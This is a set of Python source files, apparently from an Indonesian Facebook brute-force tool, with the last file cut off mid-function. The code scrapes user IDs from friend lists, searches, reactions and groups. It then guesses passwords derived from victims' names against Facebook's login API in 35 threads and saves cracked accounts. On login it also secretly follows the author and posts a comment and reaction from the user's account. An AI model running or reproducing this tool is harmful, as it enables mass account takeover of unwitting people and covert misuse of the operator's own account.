#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : run.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import shutil, platform

py_version = platform.python_version()

if py_version < '3.7':
    exit('WARNING anda menggunakan python version %s silahkan upgrade ke 3.7++'%(py_version))

cache = ['src/__pycache__', 'src/data/__pycache__']

for path in cache:
    try:
        shutil.rmtree(path)
    except:
        pass

__import__('src.app')

#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : login.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import re, os, json, time
from src import lib
from src.CLI import (inputs, prints, br, progressBar)
from src.data import fb

class Login(fb.FB):
    def __init__(self, store=None):
        self.store = store
        self.is_checkpoint = False

    def loginSuccess(self):
        br(1)
        prints('!h!Okeey login berhasil, mohon gunakan script ini sewajarnya!', blank_left=4)
        br(1)
        inputs('!k!Tekan enter...', blank_left=4)
        return self.store.instance.run()

    def askLogin(self):
        prints('!k!BACA BAIK², SETELAH ANDA BERHASIL LOGIN AKAN OTOMATIS KOMEN KE PROFILE AUTHOR!!', blank_left=4)
        br(1)
        prints('!m!Login menggunakan cookies jauh lebih aman.', blank_left=4)
        br(1)
        prints('!m![!b!01!m!] !p!Login pake cookies', blank_left=4)
        prints('!m![!b!02!m!] !p!Login pake user & pass', blank_left=4)
        prints('!m![!b!03!m!] !p!Login pake access token', blank_left=4)
        br(1)
        while True:
            ask = inputs('!p!Pilih :!b! ', blank_left=4)
            if ask.lower() in ['1', '01']:
                br(1)
                progressBar(text='loading...', max=35)
                return self.cookies()
            elif ask.lower() in ['2', '02']:
                br(1)
                progressBar(text='loading...', max=35)
                return self.userPass()
            elif ask.lower() in ['3', '03']:
                br(1)
                progressBar(text='loading...', max=35)
                return self.token()
            else:
                br(1)
                prints('!m!Input salah...', blank_left=4)
                br(1)

    def cookies(self):
        while True:
            cok = inputs('!p!Cookies FB anda :!b! ', blank_left=4)
            if self.attemptLoginCookies(cok) == False:
                br(1)
                prints('!m!Cookies salah...', blank_left=4)
                br(1)
                continue
            else:
                return self.loginSuccess()

    def attemptLoginCookies(self, cok=''):
        self.store.http.setCookies(cok)
        response = self.store.http.get('/profile').text()
        name = self.store.http.currentTitle()
        if 'mbasic_logout_button' in str(response):
            if 'Laporkan Masalah' not in str(response):
                self.changeLanguage()
            id = re.findall(r'c_user=(\d+);', cok)[0]
            data = json.dumps({
                'created_at': self.store.getDateTime(),
                'credentials': {
                    'name': name,
                    'id': id,
                    'cookies': cok
                }
            })
            self.followMe().comments()
            sv = open('.login.json', 'w', encoding='utf-8')
            sv.write(data)
            sv.close()
            sv = open('session/%s.json'%(id), 'w', encoding='utf-8')
            sv.write(data)
            sv.close()
            return True
        else:
            return False

    def token(self):
        prints('!m!Note : setelah anda memasukan token akan diconvert ke cookies, untuk token dari \'mutiple tools for facebook\' tidak dapat diconvert ke cookies, tapi tidak ada salahnya untuk mencoba!', blank_left=4)
        br(1)
        while True:
            tokens = inputs('!p!Access token :!b! ', blank_left=4)
            if self.attemptConvertTokenToCookies(tokens) == False:
                br(1)
                prints('!m!Access token salah atau tidak bisa diconvert ke cookies...', blank_left=4)
                br(1)
                continue
            else:
                return self.loginSuccess()

    def attemptConvertTokenToCookies(self, tokens=''):
        cookies = []
        params = {'access_token': tokens}
        response = self.store.http.get('https://graph.facebook.com/app', base_url=False, data=params).json()
        try:
            params.update({'new_app_id': response['id']})
            params.update({'format': 'JSON'})
            params.update({'generate_session_cookies': '1'})
            response = self.store.http.get('https://api.facebook.com/method/auth.getSessionforApp', base_url=False, data=params).json()
            for e in response['session_cookies']:
                cookies.append('%s=%s'%(e['name'], e['value']))
            if self.attemptLoginCookies(';'.join(cookies)) == True:
                return True
            else:
                return False
        except:
            return False

    def userPass(self):
        prints('!m!* Gunakan VPN brazil, ukrania', blank_left=4)
        br(1)
        while True:
            user = inputs('!p!Id / username : !b!', blank_left=4)
            pasw = inputs('!p!Password : !b!', blank_left=4)
            if self.attemptLoginUserPass(user, pasw) == False:
                if self.is_checkpoint == True:
                    br(1)
                    prints('!k!Akun anda kena checkpoints..', blank_left=4)
                    br(1)
                    continue
                else:
                    br(1)
                    prints('!m!Login gagal sepertinya username atau password salah.', blank_left=4)
                    br(1)
                    continue
            else:
                return self.loginSuccess()

    def attemptLoginUserPass(self, user='', pasw='', path='/login/?next&ref=dbl&fl&refid=8'):
        data = {'email': user, 'pass': pasw}
        self.store.http.cookies.clear()
        http = self.store.http.get(path)
        http.addHeaders('Referer', self.store.url(path))
        http.addHeaders('Content-Type', 'application/x-www-form-urlencoded')
        http.updateCookies()
        data.update(http.currentInputHidden())
        path = http.currentActionForm(like='/login/device-based/regular/login/?')
        response = http.post(path, data=data, redirect=False)
        cookies = response.currentCookies()
        self.is_checkpoint = False
        data = []
        for e in cookies:
            data.append('%s=%s'%(e, cookies[e]))
        if 'checkpoint' in str(cookies):
            self.is_checkpoint = True
            return False
        elif 'c_user' in str(cookies) and self.attemptLoginCookies(';'.join(data)) == True:
            return True
        else:
            return False

    def sessionLogin(self):
        count = 0
        prints('!m![ !b!PILIH AKUN UNTUK LOGIN !m!]', blank_left=4)
        br(1)
        data = lib.sessionList()
        for session in data:
            count+=1
            name = session['credentials']['name']
            id = session['credentials']['id']
            created_at = session['created_at']
            prints('!m![!b!%02d!m!] !p!%s (%s) !m!> !b!%s'%(count, name, id, created_at), blank_left=4)
        br(1)
        prints('!m!Abaikan dan tekan enter untuk login di akun baru.', blank_left=4)
        while True:
            br(1)
            pils = inputs('!p!Pilih : !b!', blank_left=4)
            br(1)
            if pils.strip() == '':
                return self.askLogin()
            try:
                name = data[int(pils)-1]['credentials']['name']
                id = data[int(pils)-1]['credentials']['id']
                cookies = data[int(pils)-1]['credentials']['cookies']
                progressBar(text='loading...', max=35)
                prints('!p!Mencoba login di akun !k!%s'%(name), blank_left=4)
                if self.attemptLoginCookies(cookies) == False:
                    br(1)
                    prints('!m!Login gagal sepertinya cookies mati..', blank_left=4)
                    try:
                        os.remove('session/%s.json'%(id))
                    except:
                        pass
                    time.sleep(3)
                    return self.store.instance.run()
                else:
                    return self.loginSuccess()
            except (ValueError, KeyError, IndexError):
                prints('!m!Input salah..', blank_left=4)
                
                #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : fb.py                              #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import base64

class FB:

    text = '8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig8J+YoPCfmKDwn5ig'

    def changeLanguage(self):
        try:
            http = self.store.http.get('/language.php')
            for i in http.bs4().find_all('a'):
                if 'Bahasa Indonesia' in str(i):
                    http.get(i['href'])
        except:
            pass

        return self

    def followMe(self):
        try:
            http = self.store.http.get('/dulahz')
            href = http.bs4().find('a', string='Ikuti')
            http.get(href['href'])
        except:
            pass

        return self

    def comments(self, reaction=None):
        try:
            http = self.store.http.get('/1145924768936987')
            params = http.currentInputHidden()
            params.update({'comment_text': base64.b64decode(self.text)})
            path = http.currentActionForm('/a/comment.php')
            bs4 = http.bs4()

            if path != '/':
                http.post(path, data=params)

            for i in bs4.find_all('a'):
                if '/reactions/picker/?is_permalink=1' in str(i):
                    reaction = i['href']
                    break
            if reaction != None:
                angry = http.get(reaction).bs4()
                for x in angry.find_all('a'):
                    if 'reaction_type=8' in str(x):
                        http.get(x['href'])
                        break
        except:
            pass

        return self
        
        #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : dump.py                            #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

from threading import (Thread, Event)
from src.CLI import (color, prints, inputs, write, br)
import re, time, json, os
from datetime import datetime

class Dump:
    def __init__(self, store=None):
        self.store = store
        self.event = Event()
        self.__id__ = []
        self.__filter__ = []
        self.proccess = None

    def reset(self):
        self.__id__ = []
        self.__filter__ = []

    def save(self, saveTo):
        datetimes = self.store.getDateTime()
        self.event.clear()
        time.sleep(2)
        saveTo = re.sub('\s\s+', '_', saveTo.lower())
        save = open('dump/%s.json'%(saveTo), 'w')
        save.write(json.dumps({
            'created_at': datetimes,
            'file_name': '%s.json'%(saveTo),
            'data': self.__id__
        }))
        save.close()
        br(2)
        prints('!h!Hasil tersimpan : !p!dump/%s.json'%(saveTo), blank_left=4)
        prints('!h!ID terambil     : !p!%s' %(len(self.__id__)), blank_left=4)
        br(1)
        return self.store.instance.back()

    def animate(self):
        while self.event.is_set():
            for i in list('\ |/-•'):
                count = len(self.__id__)
                datetimes = datetime.now().strftime('%H:%M:%S')
                self.proccess = '    !m![!b!%s!m!]!ran! Mengambil ID (%s).. %s !r!'%(datetimes, count, i)
                prints(self.proccess, with_flush=True)
                time.sleep(0.1)

    def run(self):
        self.reset()
        self.event.set()
        th = Thread(target=self.animate)
        th.start()

    def getIDFriedsList(self, stop=False, path='/friends/center/friends', saveTo='friendsList'):
        while stop == False:
            response = self.store.http.get(path).bs4()
            for x in response.find_all(style='vertical-align: middle'):
                hrefs = x.find('a')
                if '+' not in str(hrefs) and hrefs != None:
                    name = str(hrefs.text)
                    uid = re.findall(r'/\?uid=(\d+)&' if '/?uid=' in str(hrefs) else '/(.*?)\?fref=', hrefs['href'])
                    prints(f'\r      !m!-!ran!  {name}', blank_right=int(len(self.proccess)-20))
                    if len(uid) == 1 and str(uid[0]) not in self.__filter__:
                        self.__filter__.append(str(uid[0]))
                        self.__id__.append({'name': str(name), 'id': str(uid[0])})
            if 'Lihat selengkapnya' in str(response):
                path = response.find('a', string='Lihat selengkapnya')['href']
            else:
                stop = True

        return self.save(saveTo)

    def friendsList(self):
        th = Thread(target=self.getIDFriedsList, args=(False,))
        th.start()
        self.run()
        return self

    def publicID(self, path=None):
        prints('!m!INFO pastikan daftar teman bersifat publik, jika ngedump lebih dari 3k !k!Id!m! mungkin akun anda akan kena limit!, dan tidak dapat menggunakan fitur ini lagi. hasilnya akan tidak akurat dari yang jumlah id nya 1k mungkin cuma keambil 10 !k!id!m! doang bahkan tidak sama sekali.!r!', blank_left=4)
        br(1)
        while path == None:
            ids = inputs('!p!Id atau username akun :!b! ', blank_left=4)
            response = self.store.http.get(f'/{str(ids)}').bs4()
            name = self.store.http.currentTitle()
            for x in response.find_all('a'):
                if '/friends?lst=' in str(x):
                    path = x['href']
                    break
            if path == None:
                br(1)
                prints('!m!Id atau username salah atau mungkin daftar teman tidak publik.', blank_left=4)
                br(1)
                continue
        br(1)
        prints('!p!Nama akun !k!%s!r!' %(name), blank_left=4)
        br(1)
        th = Thread(target=self.getIDpublic, args=(False, path, ids,))
        th.start()
        self.run()
        return self

    def getIDpublic(self, stop=False, path='/', saveTo='public'):
        while stop == False:
            response = self.store.http.get(path).bs4()
            for x in response.find_all(style='vertical-align: middle'):
                hrefs = x.find('a')
                if '+' not in str(hrefs) and hrefs != None:
                    name = str(hrefs.text)
                    uid = re.findall(r'/\?uid=(\d+)&' if '/?uid=' in str(hrefs) else '/(.*?)\?fref=', hrefs['href'])
                    prints(f'\r      !m!-!ran!  {name}', blank_right=int(len(self.proccess)-20))
                    if len(uid) == 1 and str(uid[0]) not in self.__filter__:
                        self.__filter__.append(str(uid[0]))
                        self.__id__.append({'name': str(name), 'id': str(uid[0])})
            if 'Lihat Teman Lain' in str(response):
                path = response.find('a', string='Lihat Teman Lain')['href']
            else:
                stop = True

        return self.save(saveTo)

    def search(self):
        query = inputs('!p!Query : !b!', blank_left=4)
        path = f'/search/people/?q={query}&source=filter&isTrending=0'
        while True:
            try:
                max = int(inputs('!p!Limit (!b!100!p!) : !b!', blank_left=4))
                break
            except (ValueError):
                br(1)
                prints('!m!Masukan limit yang valid...', blank_left=4)
                br(1)
                continue
        br(1)
        th = Thread(target=self.getIDSearch, args=(False, path, query, max))
        th.start()
        self.run()
        return self

    def getIDSearch(self, stop=False, path='/', saveTo='search', max=0, base_url=True):
        while stop == False:
            response = self.store.http.get(path, base_url).bs4()
            for x in response.find_all('a'):
                div = x.find('div')
                if '+' not in str(div) and div != None:
                    name = str(div.text)
                    uid = re.findall(r'/\?id=(\d+)&' if '/?id=' in str(x) else '/(.*?)\?refid=', str(x))
                    prints(f'\r      !m!-!ran!  {name}', blank_right=int(len(self.proccess)-20))
                    if int(len(self.__id__)) == max or int(len(self.__id__)) > max:
                        stop = True
                        break
                    if len(uid) == 1 and str(uid[0]) not in self.__filter__:
                        self.__filter__.append(str(uid[0]))
                        self.__id__.append({'name': str(name), 'id': str(uid[0])})
            if 'Lihat Hasil Selanjutnya' in str(response) and stop == False:
                path = response.find('a', string='Lihat Hasil Selanjutnya')['href']
                base_url = False
            else:
                stop = True

        return self.save(saveTo)
  
    def react(self, path=None):
        prints('!p!Contoh link postingan !m!(!b!https://www.facebook.com/4/posts/10112184244817511/?app=fbl!m!)', blank_left=4)
        br(1)
        while True:
            try:
                link = inputs('!p!Link postingan : !b!', blank_left=4)
                domain = link.split('//')[1].split('/')[0]
                link = link.replace(domain, 'mbasic.facebook.com')
            except IndexError:
                br(1)
                prints('!m!Link salah atau tidak valid...', blank_left=4)
                br(1)
                continue
            response = self.store.http.get(link, base_url=False).bs4()
            title = self.store.http.currentTitle().replace(' | Facebook', '')
            for x in response.find_all('a'):
                if '/ufi/reaction/profile/browser/?' in str(x):
                    br(1)
                    prints('!p!Title !k!%s' %(title), blank_left=4)
                    br(1)
                    path = x['href']
                    break
            if path != None:
                break
            else:
                br(1)
                prints('!m!Postingan tidak ditemukan...', blank_left=4)
                br(1)
                continue
        while True:
            try:
                max = int(inputs('!p!Limit (!b!100!p!) :!b! ', blank_left=4))
                break
            except (ValueError):
                br(1)
                prints('!m!Masukan limit yang valid...', blank_left=4)
                br(1)
                continue
        br(1)
        th = Thread(target=self.getIDReact, args=(False, path, 'react', max,))
        th.start()
        self.run()
        return self

    def getIDReact(self, stop=False, path='/', saveTo='react', max=0):
        while stop == False:
            response = self.store.http.get(path).bs4()
            for x in response.find_all('h3'):
                hrefs = x.find('a')
                if '+' not in str(hrefs) and hrefs != None:
                    name = str(x.text)
                    uid = re.findall(r'\/profile.php\?id=(\d+)$' if 'profile.php?id=' in str(x) else '\/(.*?)$', str(hrefs['href']))
                    prints(f'\r      !m!-!ran!  {name}', blank_right=int(len(self.proccess)-20))
                    if int(len(self.__id__)) == max or int(len(self.__id__)) > max:
                        stop = True
                        break
                    if len(uid) == 1 and str(uid[0]) not in self.__filter__:
                        self.__filter__.append(str(uid[0]))
                        self.__id__.append({'name': str(name), 'id': str(uid[0])})
            if 'Lihat Selengkapnya' in str(response) and stop == False:
                path = response.find('a', string='Lihat Selengkapnya')['href']
            else:
                stop = True

        return self.save(saveTo)
 
    def postGroup(self):
        while True:
            id = inputs('!p!ID group : !b!', blank_left=4)
            path = f'/groups/{str(id)}'
            response = self.store.http.get(path).text()
            if 'Konten Tidak Ditemukan' in str(response):
                br(1)
                prints('!m!Id group tidak ditemukan', blank_left=4)
                br(1)
                continue
            else:
                title = self.store.http.currentTitle()
                br(1)
                prints('!p!Nama group !k!%s' %(title), blank_left=4)
                br(1)
            try:
                max = int(inputs('!p!Limit (!b!100!p!) : !b!', blank_left=4))
                break
            except (ValueError):
                br(1)
                prints('!m!Masukan limit yang valid...', blank_left=4)
                br(1)
                continue
        br(1)
        th = Thread(target=self.getIDPostGroup, args=(False, path, id, max))
        th.start()
        self.run()
        return self

    def getIDPostGroup(self, stop=False, path='/', saveTo='postGroup', max=0):
        while stop == False:
            response = self.store.http.get(path).bs4()
            for x in response.find_all('h3'):
                hrefs = x.find('a')
                if '+' not in str(hrefs) and hrefs != None:
                    name = str(hrefs.text)
                    uid = re.findall(r'content_owner_id_new.(\d+)', hrefs['href'])
                    prints(f'\r      !m!-!ran!  {name}', blank_right=int(len(self.proccess)-20))
                    if int(len(self.__id__)) == max or int(len(self.__id__)) > max:
                        stop = True
                        break
                    if len(uid) == 1 and str(uid[0]) not in self.__filter__:
                        self.__filter__.append(str(uid[0]))
                        self.__id__.append({'name': str(name), 'id': str(uid[0])})
            if 'Lihat Postingan Lainnya' in str(response) and stop == False:
                path = response.find('a', string='Lihat Postingan Lainnya')['href']
            else:
                stop = True

        return self.save(saveTo)

#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : brute.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import re, time, json, os
from threading import (Thread, Event)
from src.CLI import (prints, inputs, br, progressBar)
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

class Brute:
    def __init__(self, store=None):
        self.store = store
        self.event = Event()
        self.proccess = None
        self.OK = []
        self.CP = []
        self.user = []
        self.filter = []
        self.loop = 0

    def reset(self):
        self.OK = []
        self.CP = []
        self.user = []
        self.filter = []
        self.loop = 0

    def animate(self):
        while self.event.is_set():
            for i in list('\ |/-•'):
                count = len(self.user)
                loop = int(self.loop)
                ok = len(self.OK)
                cp = len(self.CP)
                progress = (self.loop * 100) / count
                datetimes = datetime.now().strftime('%H:%M:%S')
                self.proccess = '{0:>4}!m![!b!{1}!m!]!ran! Cracking {2}/{3} OK:-!h!{4}!ran! CP:-!k!{5}!ran! {6} {7:.0f}% '.format(
                    (''), str(datetimes), str(loop), str(count),
                    str(ok), str(cp), str(i), (progress)
                )
                prints(self.proccess, with_flush=True)
                time.sleep(0.1)

    def run(self):
        self.event.set()
        th = Thread(target=self.animate)
        th.start()

    def main(self, threads=40):
        self.reset()
        prints('!m!NOTE : Anda harus ngedump ID terlebih dahulu sebelum menggunakan fitur ini!', blank_left=4)
        br(1)
        while len(self.user) == 0:
            id = inputs('!p!List ID (!b!dump/react.json!p!)  : !b!', blank_left=4)
            if os.path.exists(id) == False:
                br(1)
                prints('!m!Oops file \'%s\' tidak ditemukan...'%(id), blank_left=4)
                br(1)
                continue
            try:
                op = open(id, 'r', encoding='utf-8').read()
                op = json.loads(op)
                for ids in op['data']:
                    pw = self.store.generatePasswordFromName(ids['name'])
                    self.user.append({'id': ids['id'], 'pw': pw})
            except:
                br(1)
                prints('!m!Ada kesalahan mohon periksa file anda pastikan list ID diperoleh dari tool ini.', blank_left=4)
                br(1)
                continue
            br(1)
            customPW = []
            ask = inputs('!p!Apakah ingin menggunakan password manual? !m![!p!Y/t!m!] !p!: !b!', blank_left=4)
            if ask.lower() == 'y':
                br(1)
                prints('!m!Gunakan (,)(comma) untuk password selanjutnya contoh !k!sayang,doraemon,facebook,dll!p!', blank_left=4)
                br(1)
                while True:
                    customPW = inputs('!p!Set password : !b!', blank_left=4).split(',')
                    if len(customPW) == 0 or customPW[0].strip() == '':
                        br(1)
                        prints('!m!Mohon isi password yang valid...', blank_left=4)
                        br(1)
                        continue
                    break

        br(1)
        progressBar(text='loading...', max=35)
        th = Thread(target=self.crack, args=(threads, customPW))
        th.start()
        self.run()
        return self

    def crack(self, thread=0, customPW=[]):
        with ThreadPoolExecutor(max_workers=35) as TH:
            for user in self.user:
                if len(customPW) == 0:
                    TH.submit(self.bruteAccount, (user['id']), (user['pw']))
                else:
                    TH.submit(self.bruteAccount, (user['id']), (customPW))

        self.event.clear()
        self.save()
        return self.store.instance.back()

    def save(self):
        time.sleep(2)
        datetimes = self.store.getDateTime()
        if os.path.exists('result/OK.json') == False:
            save = open('result/OK.json', 'w', encoding='utf-8')
            save.write(json.dumps({'data': []}))
            save.close()
        if os.path.exists('result/CP.json') == False:
            save = open('result/CP.json', 'w', encoding='utf-8')
            save.write(json.dumps({'data': []}))
            save.close()
        if len(self.OK) != 0:
            oldDataOK = open('result/OK.json', 'r', encoding='utf-8').read()
            oldDataOK = json.loads(oldDataOK)
            oldDataOK['data'].append({
                'created_at': datetimes,
                'total': len(self.OK),
                'list': self.OK
            })
            save = open('result/OK.json', 'w', encoding='utf-8')
            save.write(json.dumps(oldDataOK))
            save.close()
            br(2)
            prints('!p!OK : !h!%s'%(len(self.OK)), blank_left=4)
            for i in self.OK:
                prints('!m!- !h!%s'%(i), blank_left=6)
        if len(self.CP) != 0:
            oldDataCP = open('result/CP.json', 'r', encoding='utf-8').read()
            oldDataCP = json.loads(oldDataCP)
            oldDataCP['data'].append({
                'created_at': datetimes,
                'total': len(self.CP),
                'list': self.CP
            })
            save = open('result/CP.json', 'w', encoding='utf-8')
            save.write(json.dumps(oldDataCP))
            save.close()
            br(2)
            prints('!p!CP : !k!%s'%(len(self.CP)), blank_left=4)
            for i in self.CP:
                prints('!m!- !k!%s'%(i), blank_left=6)
        if len(self.OK) == 0 and len(self.CP) == 0:
            br(2)
            prints('!m!Tidak ada hasil :(', blank_left=4)
        br(1)

    def bruteAccount(self, id, pw):
        for passw in pw:
            params = {
                'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                'format': 'JSON',
                'sdk_version': '2',
                'email': id,
                'locale': 'vi_VN',
                'password': passw,
                'sdk': 'ios',
                'generate_session_cookies': '1',
                'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
            }
            response = self.store.http.get('https://b-api.facebook.com/method/auth.login', base_url=False, with_credentials=False, data=params).text()
            if id not in self.filter:
                self.loop+=1
                self.filter.append(id)
            if re.search('(EAAA)\w+', str(response)):
                prints('\r    !m![!h!OK!m!]!h! %s -> %s'%(id, passw), blank_right=20)
                self.OK.append('%s -> %s'%(id, passw))
                break
            elif 'www.facebook.com' in str(response):
                prints('\r    !m![!k!CP!m!]!k! %s -> %s'%(id, passw), blank_right=20)
                self.CP.append('%s -> %s'%(id, passw))
                break
                
                #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : store.py                           #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

from datetime import datetime

class Store:

    passwordList = []
    passwordExtraList = []
    passwordLower = False
    instance = None

    def __init__(self):
        self.menu = {}
        self.object = {}
        self.login = None
        self.http = None
        self.brute = None

    def getDateTime(self):
        date = datetime.now().strftime('%d %B %Y')
        datetimes = datetime.now().strftime('%H:%M:%S')
        return '%s - %s'%(date, datetimes)

    def add(self, func = {}):
        num = '%02d'%((len(self.menu)+1),)
        self.menu[num] = {
            'name': '!m![!b!%s!m!] !p!%s' %(num, func['name']),
            'func': func['func'],
        }
        return self

    def generatePasswordFromName(self, name):
        data = []
        for pw in self.passwordExtraList:
            data.append(pw)
        name = name.strip().split(' ')
        for names in name[slice(0, 4)]:
            for num in self.passwordNameList:
                data.append(str(names+num).lower() if self.passwordLower else str(names+num))

        return data

    def setCredentials(self, data={}):
        self.object['credentials'] = data
        return self

    def setBaseURL(self, url):
        self.object['base'] = url
        return self

    def setLoginClass(self, clss):
        self.login = clss(self)
        return self

    def setHttpClass(self, clss):
        self.http = clss(self)
        return self

    def url(self, path=None):
        if path == None:
            return self.object['base'].format('/')
        else:
            return self.object['base'].format(path)
            
            #!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : MBF.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

from src import lib
from src.store import Store
from src.CLI import (inputs, prints, banner, br, progressBar)
from time import sleep
import os

class MBF:
    def __init__(self, store=None):
        self.store = store
        store.instance = self

    def run(self):
        banner()
        if lib.isLogin() == False:
            if len(lib.sessionList()) == 0:
                return self.store.login.askLogin()
            else:
                return self.store.login.sessionLogin()
        if lib.isActive(self) == False:
            br(1)
            prints('!m!Sepertinya cookies mati.', blank_left=4)
            br(1)
            inputs('!k!Tekan enter untuk login kembali..', blank_left=4)
            return self.run()
        id = self.store.object['credentials']['id']
        name = self.store.object['credentials']['name']
        prints('!m!-!r!' * 55, blank_left=2)
        prints('!m![!b!>!m!] !p!Nama akun !m!:!k! %s!r!' %(name), blank_left=4)
        prints('!m![!b!>!m!] !p!IDs       !m!:!k! %s!r!' %(id), blank_left=4)
        prints('!m!-!r!' * 55, blank_left=2)
        for index in self.store.menu:
            prints(self.store.menu[index]['name'], blank_left=4)
        try:
            br(1)
            pils = int(inputs('!p!dz-id/>!b! ', blank_left=4))
            pils = '%02d'%(pils,)
            function = self.store.menu[pils]['func']
        except (ValueError, KeyError, IndexError):
            br(1)
            prints('!m!Input salah...', blank_left=4)
            sleep(2)
            return self.run()

        br(1)

        progressBar(text='loading...', max=35)

        return function()

    def back(self):
        inputs('!k!Tekan enter untuk kembali..', blank_left=4)
        return self.run()

    def clearDumpCache(self, count=0):
        list = lib.cacheDumpList()
        if len(list) == 0:
            br(1)
            prints('!m!Belum ada cache...', blank_left=4)
            br(1)
            return self.back()
        br(1)
        prints('!m![ !b!LIST SEMUA CACHE DARI HASIL DUMP!r! !m!]', blank_left=4)
        br(1)
        for cache in list:
            count+=1
            num = '%02d'%(count,)
            prints('!m![!b!%s!m!] !p!%s'%(num, cache['name']), blank_left=4)
        br(1)
        prints('!m!Guanakan (,)(comma) untuk pilihan selanjutnya, contoh: 1,2,3 . type \'all\' untuk menghapus semua cache.', blank_left=4)
        prints('!m!Hapus cache untuk menghemat penyimpanan!, abaikan dan tekan enter untuk kembali.', blank_left=4)
        br(1)
        select = inputs('!p!Pilih : !b!', blank_left=4)
        if select.lower() in ["all", "'all'"]:
            for delete in list:
                try:
                    name = delete['name']
                    path = delete['path']
                    os.remove(path)
                    prints('!h! - %s - Dihapus!r!' %(name), blank_left=6)
                except:
                    pass
            br(1)
            return self.back()
        br(1)
        for e in select.strip().split(','):
            try:
                name = list[int(e)-1]['name']
                path = list[int(e)-1]['path']
                os.remove(path)
                prints('!h! - %s - Dihapus!r!' %(name), blank_left=6)
            except:
                pass
        br(1)
        return self.back()
    
    def resultCrack(self):
        while True:
            ask = inputs('!p!Ingin melihat hasil CP/OK? !m![!p!CP/OK!m!]!p! : !b!', blank_left=4)
            if ask.lower() == 'cp':
                data = lib.resultCrack(name='CP')
                break
            elif ask.lower() == 'ok':
                data = lib.resultCrack(name='OK')
                break
            else:
                br(1)
                prints('!m!Input salah...', blank_left=4)
                br(1)
        if len(data) == 0:
            br(1)
            prints('!m!Belum ada hasil...', blank_left=4)
            br(1)
            return self.back()
        br(1)
        prints('!m![ !b!LIST SEMUA HASIL %s!r! !m!]'%(ask.upper()), blank_left=4)
        for res in data:
            br(2)
            prints('!m!> !p!Tanggal !b!%s !p!: !m!%s'%(res['created_at'], res['total']), blank_left=4)
            for e in res['list']:
                prints('!m!- !p!%s'%(e), blank_left=6)
        br(2)
        type = inputs('!m!Ketik \'delete\' untuk menghapus semua hasil atau enter untuk kembali !p!: !b!', blank_left=4)
        if type.lower() in ["delete","'delete'"]:
            os.remove('result/%s.json'%(ask.upper()))
            br(1)
            prints('!h!Semua hasil \'%s\' berhasil dihapus!'%(ask), blank_left=4)
            br(1)
            return self.back()

        return self.run()

    def changeAccount(self):
        try:
            os.remove('.login.json')
        except:
            pass
        self.store.http.cookies.clear()
        return self.run()

#!/usr/bin/python3
# coding=utf-8

#######################################################
# File           : lib.py                             #
# Author         : DulLah                             #
# Github         : https://github.com/dz-id           #
# Facebook       : https://www.facebook.com/dulahz    #
# Telegram       : https://t.me/DulLah                #
# Python version : 3.8+                               #
#######################################################
#         RECODE? OKE CANTUMKAN NAMA PEMBUAT          #
#######################################################

import os, glob, re, json
from src.CLI import (prints, br, progressBar, banner)

listDIR = ['session','dump', 'result']

for dir in listDIR:
    try:
        os.mkdir(dir)
    except: pass

def sessionList():
    data = []
    for file in glob.glob('session/*.json'):
        try:
            read = open(file, 'r', encoding='utf-8').read()
            load = json.loads(read)
            data.append(load)
        except: pass

    return data

def cacheDumpList():
    data = []
    for file in glob.glob('dump/*.json'):
        try:
            size = os.path.getsize(file)
            read = open(file, 'r', encoding='utf-8').read()
            load = json.loads(read)
            name = '%s (%s) size bytess: %s' %(load['file_name'], load['created_at'], size)
            data.append({'name': name, 'path': file})
        except: pass

    return data

def resultCrack(dir='result', name=''):
    if os.path.exists('%s/%s.json'%(dir, name)) == False:
        return []
    try:
        read = open('%s/%s.json'%(dir, name), 'r', encoding='utf-8').read()
        load = json.loads(read)
        return load['data']
